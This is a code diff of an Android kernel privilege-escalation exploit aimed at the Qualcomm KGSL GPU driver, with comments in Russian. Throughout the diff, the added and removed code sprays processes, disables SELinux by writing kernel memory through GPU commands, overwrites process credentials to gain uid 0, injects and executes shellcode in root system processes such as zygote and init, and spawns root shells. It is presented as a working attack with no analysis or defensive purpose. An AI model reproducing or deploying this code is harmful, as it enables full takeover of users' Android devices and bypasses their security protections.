@@ -68,6 +68,8 @@
 #define GBUF_MMAP_CORRUPT    0x9f8
 #define GBUF_EX_OVER         0xffc
 #define GBUF_TASK_SPRAY      0x901
+#define GBUF_KBASE           0x80
+#define GBUF_SELINUX         0x90
 #define GBUF_PTE_SAVE        0xf00
 #define GBUF_MMAP_CHECK      0xa00
 #define GBUF_LIB_BASE        0x400
@@ -1299,21 +1301,43 @@ static void safe_cred_patch(void)
     }
 
     if (kernel_base == 0) {
-        kernel_base = find_kernel_base_from_task_va(task_va);
-        if (kernel_base == 0)
-            kernel_base = get_kernel_base();
+        kernel_base = *(uint64_t *)&gbuf[GBUF_KBASE];
+        if (kernel_base == 0) {
+            kernel_base = find_kernel_base_from_task_va(task_va);
+            if (kernel_base == 0) kernel_base = get_kernel_base();
+        }
         fprintf(stderr, "[CHILD] Kernel base: 0x%lx\n", (unsigned long)kernel_base);
+    }
+
+    uint64_t selinux_addr = *(uint64_t *)&gbuf[GBUF_SELINUX];
+    if (selinux_addr == 0) {
+        uint64_t auto_offset = find_offsets_auto(kernel_base);
+        selinux_addr = kernel_base + (auto_offset != 0 ? auto_offset : SELINUX_OFFSET);
     }
 
     // If Parent already found cred_ptr, use it directly
     if (cred_ptr != 0) {
         fprintf(stderr, "[CHILD] Using cred_ptr from Parent: 0x%lx\n", (unsigned long)cred_ptr);
-        disable_selinux_via_gpu(fd);
+        
+        // Disable SELinux
+        if (selinux_addr != 0) {
+            fprintf(stderr, "[CHILD] Disabling SELinux at 0x%lx...\n", (unsigned long)selinux_addr);
+            uint32_t zero = 0;
+            gpu_write_bytes(fd, selinux_addr, &zero, 4);
+        }
+
         patch_cred_via_gpu(fd, cred_ptr, cred_ptr);
         if (getuid() == 0) {
             fprintf(stderr, "[CHILD] [+] SUCCESS! I AM ROOT (uid=0) via Parent's cred_ptr\n");
             patched = 1;
             goto shell;
+        } else {
+            setuid(0);
+            if (getuid() == 0) {
+                fprintf(stderr, "[CHILD] [+] SUCCESS! I AM ROOT after setuid(0)\n");
+                patched = 1;
+                goto shell;
+            }
         }
     }
 
@@ -2713,26 +2737,26 @@ restart:;
     }
 
     if (!marker_found_global) {
-        fprintf(stderr, "\n[!] 100,000 sprays exhausted. Marker not found.\n");
+        fprintf(stderr, "\n[!] 200,000 sprays exhausted. Marker not found.\n");
         return 1;
     }
 
-    for (int i = 0; i < spray_count; i++)
+    pid_t target_pid = (pid_t)(*(uint64_t *)&gbuf[GBUF_TARGET_PID]);
+    fprintf(stderr, "\n[+] Target identified: PID %d. Cleaning up spray...\n", target_pid);
+
+    int reaped = 0;
+    for (int i = 0; i < total_sprayed; i++)
     {
-        pid_t target_pid = (pid_t)(*(uint64_t *)&gbuf[GBUF_TARGET_PID]);
-        if (spray_ctrl[i].do_action == 0 && spray_ctrl[i].pid > 0 && spray_ctrl[i].pid != target_pid)
+        if (spray_ctrl[i].pid > 0 && spray_ctrl[i].pid != target_pid)
         {
-            kill(spray_ctrl[i].pid, SIGTERM);
+            kill(spray_ctrl[i].pid, SIGKILL);
         }
     }
-    for (int i = 0; i < spray_count; i++)
-    {
-        pid_t target_pid = (pid_t)(*(uint64_t *)&gbuf[GBUF_TARGET_PID]);
-        if (spray_ctrl[i].do_action == 0 && spray_ctrl[i].pid > 0 && spray_ctrl[i].pid != target_pid)
-        {
-            waitpid(spray_ctrl[i].pid, NULL, 0);
-        }
-    }
+    
+    // Ждем очистки ресурсов
+    while (waitpid(-1, NULL, WNOHANG) > 0) reaped++;
+    fprintf(stderr, "[+] Reaped %d processes. Waiting for GPU to cool down...\n", reaped);
+    sleep(2); // Даем ядру и драйверу время на очистку
 
     // -----------------------------------------------------------------------
     // [13] Kernel address resolution
@@ -2747,11 +2771,7 @@ restart:;
         }
     }
     fprintf(stderr, "[+] Kernel base: 0x%lx\n", (unsigned long)kernel_base);
-
-    uint64_t init_cred = kernel_base + INIT_TASK_OFFSET;
-    uint64_t poweroff_cmd = kernel_base + 0x2BB8EC0;
-    uint64_t orderly_poweroff = kernel_base + 0x5F96C;
-    uint64_t memstart_addr = kernel_base + 0x24C2538;
+    *(uint64_t *)&gbuf[GBUF_KBASE] = kernel_base;
 
     if (selinux_enforcing == 0)
     {
@@ -2763,296 +2783,39 @@ restart:;
             selinux_enforcing = find_selinux_enforcing_via_kbase(fd, kernel_base);
         }
     }
+    *(uint64_t *)&gbuf[GBUF_SELINUX] = selinux_enforcing;
     *(uint64_t *)&gbuf[GBUF_SET_TASKS] = selinux_enforcing;
 
     fprintf(stderr, "[+] SELinux enforcing at: 0x%lx\n", (unsigned long)selinux_enforcing);
-    fprintf(stderr, "[+] Poweroff cmd at: 0x%lx\n", (unsigned long)poweroff_cmd);
-
-    fprintf(stderr, "[child] Triggering cred patch in spray processes...\n");
     
-    // Spawn background waiters only now
-    int bg_pid = fork();
-    if (!bg_pid) {
-        int pid2 = fork();
-        if (!pid2) {
-            wait_for_flag_u8((volatile uint8_t *)&gbuf[GBUF_FOUND_PID], 0x12, WAIT_TIMEOUT_MS);
-            sleep(1);
-            gbuf[GBUF_CALL_LOGLINE] = 0x11;
-            _exit(0);
-        } else {
-            wait_for_flag_u8((volatile uint8_t *)&gbuf[GBUF_FOUND_PID], 0x11, WAIT_TIMEOUT_MS);
-            gbuf[GBUF_FOUND_PID] = 0x12;
-            waitpid(pid2, NULL, 0);
-            _exit(0);
-        }
-    }
-
-    gbuf[0] = 0xab;
+    fprintf(stderr, "[+] Triggering cred patch in target process %d...\n", target_pid);
+    
+    gbuf[0] = 0xab; // ТРИГГЕР!
     gbuf[GBUF_FOUND_PID] = 0x11;
-    fprintf(stderr, "[+] Set FOUND_PID=0x11 for child1\n");
-    usleep(100000);
-
-    if (!wait_for_flag_u8((volatile uint8_t *)&gbuf[GBUF_TASK_SPRAY], 0x1, WAIT_TIMEOUT_MS) &&
-        !wait_for_flag_u8((volatile uint8_t *)&gbuf[GBUF_TASK_SPRAY], 0x2, WAIT_TIMEOUT_MS))
-    {
-        fprintf(stderr, "[!] timeout waiting for TASK_SPRAY_CLEAR\n");
+    
+    // Ждем результата от ребенка
+    int wait_count = 30;
+    while (wait_count-- > 0 && gbuf[GBUF_TASK_SPRAY] == 0) {
+        fprintf(stderr, ".");
+        fflush(stderr);
+        sleep(1);
     }
-    else
+    fprintf(stderr, "\n");
+
+    if (gbuf[GBUF_TASK_SPRAY] == 0x2)
     {
-        if (gbuf[GBUF_TASK_SPRAY] == 0x1)
-        {
-            fprintf(stderr, "[!] child read fail\n");
-        }
-        else if (gbuf[GBUF_TASK_SPRAY] == 0x2)
-        {
-            fprintf(stderr, "[+] child read success\n");
-        }
+        fprintf(stderr, "[+] Root shell should be active in the other terminal/process.\n");
     }
-
-    mmap_spray();
-
-    gbuf[0x910] = 1;
-    mmap_check();
-    sleep(1);
-    fprintf(stderr, "[+] mmap_check complete.\n");
-
-    uint32_t rb_count = *(uint32_t *)(gbuf + 0xb00);
-    fprintf(stderr, "[RECOVER] rb_count=%u\n", rb_count);
-
-                    recover_origin(fd);
+    else if (gbuf[GBUF_TASK_SPRAY] == 0x1)
+    {
+        fprintf(stderr, "[!] Child reported failure. Check logs.\n");
+    }
+    else 
+    {
+        fprintf(stderr, "[!] Child timed out.\n");
+    }
 
     fprintf(stderr, "[+] Exploit sequence complete!\n");
-
-    g_shellcode_va = *(uint64_t *)&gbuf[GBUF_SHELLCODE_ADDR];
-    
-    if (g_shellcode_va != 0) {
-        fprintf(stderr, "[+] Shellcode address from gbuf: 0x%lx\n", (unsigned long)g_shellcode_va);
-        gb_target_addr = g_shellcode_va;
-        *(uint64_t *)&gbuf[GBUF_LIB_BASE] = g_shellcode_va;
-
-        fprintf(stderr, "[+] Executing shellcode at 0x%lx\n", (unsigned long)g_shellcode_va);
-        
-        struct kgsl_drawctxt_create ctx = {
-            .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC};
-        if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx) == 0) {
-            unsigned ctx_id = ctx.drawctxt_id;
-            
-            struct kgsl_gpuobj_alloc ib_alloc = {
-                .size = PAGE_SIZE * 4,
-                .flags = KGSL_MEMFLAGS_USE_CPU_MAP};
-            if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &ib_alloc) == 0) {
-                unsigned ib_id = ib_alloc.id;
-                void *ib_vma = mmap(NULL, ib_alloc.mmapsize, PROT_READ | PROT_WRITE,
-                                    MAP_SHARED, fd, ((off_t)ib_id) << 12);
-                if (ib_vma != MAP_FAILED) {
-                    struct kgsl_gpuobj_info info = {.id = ib_id};
-                    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
-                    uint64_t ib_gpu = info.gpuaddr;
-                    
-                    uint32_t *cmd = (uint32_t *)ib_vma;
-                    int dw = 0;
-                    memset(ib_vma, 0, ib_alloc.mmapsize);
-                    
-                    uint32_t d_lo, d_hi;
-                    split64(g_shellcode_va, &d_lo, &d_hi);
-                    cmd[dw++] = cp_type7_packet(CP_MEM_WRITE, 3);
-                    cmd[dw++] = d_lo;
-                    cmd[dw++] = d_hi;
-                    cmd[dw++] = 0xD61F03C0;
-                    
-                    cmd[dw++] = cp_type7_packet(CP_NOP, 0);
-                    
-                    size_t ib_bytes = (size_t)dw * 4;
-                    msync(ib_vma, ib_bytes, MS_SYNC);
-                    
-                    struct kgsl_command_object obj = {
-                        .gpuaddr = ib_gpu,
-                        .size = ib_bytes,
-                        .flags = KGSL_CMDLIST_IB,
-                        .id = ib_id};
-                    struct kgsl_gpu_command gpu_cmd = {0};
-                    gpu_cmd.cmdlist = (uint64_t)(uintptr_t)&obj;
-                    gpu_cmd.cmdsize = sizeof(obj);
-                    gpu_cmd.numcmds = 1;
-                    gpu_cmd.context_id = ctx_id;
-                    
-                    if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &gpu_cmd) == 0 &&
-                        wait_timestamp(fd, ctx_id, gpu_cmd.timestamp) == 0) {
-                        fprintf(stderr, "[+] Shellcode EXECUTED!\n");
-                        
-                        uid_t uid = getuid();
-                        fprintf(stderr, "[+] Current UID after shellcode: %d\n", uid);
-                        
-                        if (uid == 0) {
-                            fprintf(stderr, "[+] ROOT! Spawning shell...\n");
-                            system("/data/data/com.termux/files/usr/bin/bash");
-                            execl("/data/data/com.termux/files/usr/bin/bash", "bash", NULL);
-                        }
-                    }
-                    
-                    munmap(ib_vma, ib_alloc.mmapsize);
-                }
-                struct kgsl_gpuobj_free fr = {.id = ib_id};
-                ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
-            }
-            struct kgsl_drawctxt_destroy dctx = {.drawctxt_id = ctx_id};
-            ioctl(fd, IOCTL_KGSL_DRAWCTXT_DESTROY, &dctx);
-        }
-    }
-
-    // ====== ПОИСК ROOT-ПРОЦЕССОВ (без повторного объявления dir) ======
-    fprintf(stderr, "[+] Looking for root processes...\n");
-    
-    DIR *proc_dir = opendir("/proc");
-    if (proc_dir) {
-        struct dirent *entry;
-        pid_t target_pid = 0;
-        const char *target_names[] = {
-            "init",
-            "surfaceflinger", 
-            "system_server",
-            "zygote64",
-            "zygote",
-            "ueventd"
-        };
-        
-        while ((entry = readdir(proc_dir)) != NULL && target_pid == 0) {
-            if (entry->d_type != DT_DIR) continue;
-            int pid = atoi(entry->d_name);
-            if (pid <= 0) continue;
-            
-            char cmdline_path[64];
-            snprintf(cmdline_path, sizeof(cmdline_path), "/proc/%d/cmdline", pid);
-            FILE *f = fopen(cmdline_path, "r");
-            if (f) {
-                char cmdline[256] = {0};
-                fread(cmdline, 1, sizeof(cmdline)-1, f);
-                fclose(f);
-                
-                for (int i = 0; i < 6; i++) {
-                    if (strstr(cmdline, target_names[i]) != NULL) {
-                        target_pid = pid;
-                        fprintf(stderr, "[+] Found %s PID: %d\n", target_names[i], target_pid);
-                        break;
-                    }
-                }
-            }
-        }
-        closedir(proc_dir);
-        
-        if (target_pid != 0) {
-            char stat_path[64];
-            snprintf(stat_path, sizeof(stat_path), "/proc/%d/stat", target_pid);
-            FILE *sf = fopen(stat_path, "r");
-            if (sf) {
-                char line[1024];
-                if (fgets(line, sizeof(line), sf)) {
-                    char *saveptr;
-                    char *token = strtok_r(line, " ", &saveptr);
-                    for (int i = 1; i < 28 && token; i++) {
-                        token = strtok_r(NULL, " ", &saveptr);
-                    }
-                    if (token) {
-                        unsigned long task_va = strtoul(token, NULL, 10);
-                        fprintf(stderr, "[+] Target task_struct VA: 0x%lx\n", task_va);
-                        
-                        uint64_t target_shellcode_va = task_va & ~(uint64_t)(PAGE_SIZE - 1);
-                        target_shellcode_va += 0x1000;
-                        
-                        if (gpu_write_task_virt(fd, target_shellcode_va, (uint8_t *)shellcode, shellcode_len) == 0) {
-                            fprintf(stderr, "[+] Shellcode injected into target at 0x%lx\n", (unsigned long)target_shellcode_va);
-                            
-                            struct kgsl_drawctxt_create ctx2 = {
-                                .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC};
-                            if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx2) == 0) {
-                                unsigned ctx_id2 = ctx2.drawctxt_id;
-                                
-                                struct kgsl_gpuobj_alloc ib_alloc2 = {
-                                    .size = PAGE_SIZE * 4,
-                                    .flags = KGSL_MEMFLAGS_USE_CPU_MAP};
-                                if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &ib_alloc2) == 0) {
-                                    unsigned ib_id2 = ib_alloc2.id;
-                                    void *ib_vma2 = mmap(NULL, ib_alloc2.mmapsize, PROT_READ | PROT_WRITE,
-                                                          MAP_SHARED, fd, ((off_t)ib_id2) << 12);
-                                    if (ib_vma2 != MAP_FAILED) {
-                                        struct kgsl_gpuobj_info info2 = {.id = ib_id2};
-                                        ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info2);
-                                        uint64_t ib_gpu2 = info2.gpuaddr;
-                                        
-                                        uint32_t *cmd2 = (uint32_t *)ib_vma2;
-                                        int dw2 = 0;
-                                        memset(ib_vma2, 0, ib_alloc2.mmapsize);
-                                        
-                                        uint32_t d_lo2, d_hi2;
-                                        split64(target_shellcode_va, &d_lo2, &d_hi2);
-                                        cmd2[dw2++] = cp_type7_packet(CP_MEM_WRITE, 3);
-                                        cmd2[dw2++] = d_lo2;
-                                        cmd2[dw2++] = d_hi2;
-                                        cmd2[dw2++] = 0xD61F03C0;
-                                        
-                                        cmd2[dw2++] = cp_type7_packet(CP_NOP, 0);
-                                        
-                                        size_t ib_bytes2 = (size_t)dw2 * 4;
-                                        msync(ib_vma2, ib_bytes2, MS_SYNC);
-                                        
-                                        struct kgsl_command_object obj2 = {
-                                            .gpuaddr = ib_gpu2,
-                                            .size = ib_bytes2,
-                                            .flags = KGSL_CMDLIST_IB,
-                                            .id = ib_id2};
-                                        struct kgsl_gpu_command gpu_cmd2 = {0};
-                                        gpu_cmd2.cmdlist = (uint64_t)(uintptr_t)&obj2;
-                                        gpu_cmd2.cmdsize = sizeof(obj2);
-                                        gpu_cmd2.numcmds = 1;
-                                        gpu_cmd2.context_id = ctx_id2;
-                                        
-                                        if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &gpu_cmd2) == 0 &&
-                                            wait_timestamp(fd, ctx_id2, gpu_cmd2.timestamp) == 0) {
-                                            fprintf(stderr, "[+] Shellcode EXECUTED in target process!\n");
-                                            fprintf(stderr, "[+] Target process (PID=%d) should now be ROOT!\n", target_pid);
-                                            fprintf(stderr, "[+] Try: su\n");
-                                        }
-                                        
-                                        munmap(ib_vma2, ib_alloc2.mmapsize);
-                                    }
-                                    struct kgsl_gpuobj_free fr2 = {.id = ib_id2};
-                                    ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr2);
-                                }
-                                struct kgsl_drawctxt_destroy dctx2 = {.drawctxt_id = ctx_id2};
-                                ioctl(fd, IOCTL_KGSL_DRAWCTXT_DESTROY, &dctx2);
-                            }
-                        }
-                    }
-                }
-                fclose(sf);
-            }
-        } else {
-            fprintf(stderr, "[!] No root process found!\n");
-            fprintf(stderr, "[+] Checking if current process is already root...\n");
-            
-            uid_t current_uid = getuid();
-            if (current_uid == 0) {
-                fprintf(stderr, "[+] ROOT! Spawning shell...\n");
-                system("/system/bin/sh");
-            } else {
-                fprintf(stderr, "[!] Current UID is %d. Exploit might have failed or is running in a child.\n", current_uid);
-            }
-        }
-    }
-
-    fprintf(stderr, "[+] Waiting for triggered process...\n");
-    {
-        uint64_t target_pid = *(uint64_t *)&gbuf[GBUF_TARGET_PID];
-        if ((pid_t)target_pid > 0)
-        {
-            waitpid((pid_t)target_pid, NULL, 0);
-        }
-    }
-
-    fprintf(stderr, "[+] Done! Check if root shell spawned.\n");
-    if (g_uaf_mmap_ptr && g_uaf_mmap_ptr != MAP_FAILED) munmap(g_uaf_mmap_ptr, g_uaf_mmapsize);
-    if (gbuf && gbuf != MAP_FAILED) munmap(gbuf, PAGE_SIZE);
-    if (fd > 0) close(fd);
-    if (fd2 > 0) close(fd2);
+    sleep(2);
     return 0;
 }
